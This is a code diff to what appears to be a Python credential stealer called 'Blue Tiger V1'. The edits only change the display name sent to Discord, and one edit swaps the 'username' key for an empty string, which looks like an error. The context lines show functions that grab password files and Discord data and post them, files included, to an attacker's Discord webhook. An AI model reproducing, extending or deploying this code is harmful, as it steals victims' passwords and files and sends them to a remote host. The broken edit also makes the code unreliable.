@@ -338,7 +338,7 @@ def dc_log():
         return set(cleaned)
 
     def send_webhook(content):
-        payload = dumps({'content': content, 'username': '~Blue Tiger V1~', 'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=678ecf40&is=678d7dc0&hm=3f2b35d7271a59145cd8e1da96a3738b74b7f74322fb68d58c153427b08a9fd1&'})
+        payload = dumps({'content': content, '': 'Blue Tiger V1', 'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=678ecf40&is=678d7dc0&hm=3f2b35d7271a59145cd8e1da96a3738b74b7f74322fb68d58c153427b08a9fd1&'})
         headers = {'Content-Type': 'application/json'}
         response = requests.post(WEBHOOK_URL, headers=headers, data=payload)
         if response.status_code != 204:
@@ -558,7 +558,7 @@ def send_to_webhook(filepath: str, webhook_url: str):
         files = {'file': f}
 
         payload = {
-            'username': '~Blue Tiger V1~',
+            'username': 'Blue Tiger V1',
             'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=678ecf40&is=678d7dc0&hm=3f2b35d7271a59145cd8e1da96a3738b74b7f74322fb68d58c153427b08a9fd1&'
         }
 
@@ -637,7 +637,7 @@ async def main():
     grab_password_files()
 
     payload = {
-        'username': '~Blue Tiger V1~',
+        'username': 'Blue Tiger V1',
         'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=678ecf40&is=678d7dc0&hm=3f2b35d7271a59145cd8e1da96a3738b74b7f74322fb68d58c153427b08a9fd1&',
         'content': '@everyone'
     }
